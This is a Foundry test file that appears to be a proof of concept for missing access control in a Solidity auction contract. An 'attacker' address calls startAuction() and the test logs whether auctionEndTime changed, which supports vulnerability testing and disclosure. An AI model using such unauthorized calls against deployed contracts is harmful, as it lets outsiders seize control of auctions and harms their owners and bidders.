// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract DosAuctionTest is Test {
    DosAuction auction;
    address owner = address(0xA);
    address attacker = address(0xB);
    uint256 public constant DURATION = 1 days;

    function setUp() public {
        vm.prank(owner);
        auction = new DosAuction();
    }

    function test_unauthorizedAuctionStart() public {
        console.log("--- BEFORE-Trigger ---");
        uint256 endTimeBefore = auction.auctionEndTime();
        console.log("auctionEndTime (pre-state): %s", endTimeBefore);
        require(endTimeBefore == 0, "Precondition: Auction should have endTime=0");

        uint256 startTime = block.timestamp;
        
        console.log("--- Trigger ---");
        vm.prank(attacker);
        auction.startAuction(DURATION);
        console.log("Attacker called startAuction()");

        console.log("--- AFTER-Trigger ---");
        uint256 endTimeAfter = auction.auctionEndTime();
        console.log("auctionEndTime (post-state): %s", endTimeAfter);
        uint256 expectedEndTime = startTime + DURATION;
        
        if (endTimeBefore == 0 && endTimeAfter == expectedEndTime) {
            console.log("Verdict: STATE CHANGED - Unauthorized user successfully started auction");
            console.log("Vulnerability Exists: Attacker modified auctionEndTime from 0 to %s", endTimeAfter);
        } else {
            console.log("Verdict: STATE UNCHANGED - Pre-state %s, post-state %s", endTimeBefore, endTimeAfter);
            console.log("Vulnerability not Exist: AuctionEndTime not modified as expected");
        }
    }
}